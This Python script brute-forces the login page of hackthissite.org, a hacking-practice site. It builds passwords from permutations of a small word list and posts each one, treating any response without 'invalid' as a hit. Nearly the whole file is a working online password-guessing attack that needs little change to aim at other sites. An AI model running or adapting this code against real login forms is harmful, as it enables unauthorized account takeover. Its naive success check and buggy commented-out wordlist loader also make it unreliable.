
import requests
import pandas as pd
import itertools
# this page must be a login page with a username and password


url = "https://www.hackthissite.org/user/login"

username = input('Enter the username ')

# code for password file
'''
password_file = input('Enter the password file')

file = open(password_file , 'r')

for password in file.readline():
    password = password.split('\n')
'''

# code for hardocded credentials testing purpose
# password = 'Password@1234567'

# code for brute force through permutations of list
master_list = ['Akshay','@','Password','1234567']

# combining three words at a time from the list to form a password
possible = itertools.permutations(master_list, 3)

# adding to the dataframe
passwords = pd.DataFrame(possible)

# combining all the columns (3) in the dataframe to construct the password
passwords['combined'] = passwords.apply(lambda row: ''.join(row.values.astype(str)), axis=1)
# print(passwords['combined'])

# Brute forcing the password
for password in passwords['combined']:
    # Collect the data needed for inspect element
    data = {'username': username, 'password': password, "Login": 'submit'}
    send_data_in_url = requests.post(url, data=data)
    if "invalid" in str(send_data_in_url.content):
        print("Password is not found %s" % password)
    else:
        print("password is found %s " % password)


